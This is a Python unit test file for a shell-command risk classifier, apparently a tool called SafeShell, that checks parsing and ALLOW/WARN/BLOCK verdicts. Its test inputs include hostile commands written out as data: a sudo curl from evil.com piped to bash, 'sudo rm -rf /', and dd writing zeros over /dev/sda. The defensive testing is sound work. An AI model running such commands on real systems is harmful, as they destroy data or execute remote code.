"""
test_semantic_fusion.py

Unit tests for semantic_fusion.py (SafeShell Fusion Pipeline).
"""

import unittest
from semantic_fusion import parse_command, fuse


class TestSemanticFusion(unittest.TestCase):
    """Test suite for semantic fusion pipeline parsing and risk verdicts."""

    def test_01_parse_basic_command(self):
        """Test parsing of basic command with flags and arguments."""
        ast = parse_command("rm -rf /tmp/testdir")
        self.assertEqual(ast["command"], "rm")
        self.assertIn("-r", ast["flags"])
        self.assertIn("-f", ast["flags"])
        self.assertTrue(ast["is_recursive"])
        self.assertTrue(ast["is_force"])
        self.assertEqual(ast["target_path"], "/tmp/testdir")
        self.assertFalse(ast["is_sudo"])

    def test_02_parse_sudo_pipe(self):
        """Test parsing of sudo command piped to another executable."""
        ast = parse_command("sudo curl https://evil.com/script.sh | bash")
        self.assertTrue(ast["is_sudo"])
        self.assertEqual(ast["command"], "curl")
        self.assertEqual(ast["pipe_to"], "bash")

    def test_03_fuse_low_risk(self):
        """Test fusion verdict for safe low-risk command."""
        res = fuse("ls -la /home/user")
        self.assertEqual(res["final_risk"], "low")
        self.assertEqual(res["action"], "ALLOW")
        self.assertIn("BENIGN", res["explanation"])

    def test_04_fuse_medium_risk(self):
        """Test fusion verdict for medium-risk command."""
        res = fuse("rm notes.txt")
        self.assertIn(res["final_risk"], ("low", "medium"))
        self.assertIn(res["action"], ("ALLOW", "WARN"))

    def test_05_fuse_high_risk_pipe(self):
        """Test fusion verdict for high-risk pipe-to-shell command."""
        res = fuse("curl http://example.com/setup.sh | bash")
        self.assertEqual(res["final_risk"], "high")
        self.assertEqual(res["action"], "WARN_CONFIRM")
        self.assertIn("pipe_curl_wget_to_shell", res["rule_result"]["matched_rule"])

    def test_06_fuse_critical_risk_rm_rf_root(self):
        """Test fusion verdict for critical-risk rm -rf / command."""
        res = fuse("sudo rm -rf /")
        self.assertEqual(res["final_risk"], "critical")
        self.assertEqual(res["action"], "BLOCK")
        self.assertIn("CRITICAL SECURITY RISK", res["explanation"])
        self.assertIsNotNone(res["suggested_alternative"])

    def test_07_fuse_critical_risk_dd_device(self):
        """Test fusion verdict for critical dd to raw block device."""
        res = fuse("dd if=/dev/zero of=/dev/sda")
        self.assertEqual(res["final_risk"], "critical")
        self.assertEqual(res["action"], "BLOCK")

    def test_08_semantic_matches_included(self):
        """Verify semantic search matches are present in fusion output."""
        res = fuse("delete a directory permanently")
        self.assertIsInstance(res["semantic_matches"], list)
        if res["semantic_matches"]:
            self.assertIn("command", res["semantic_matches"][0])


if __name__ == "__main__":
    unittest.main()
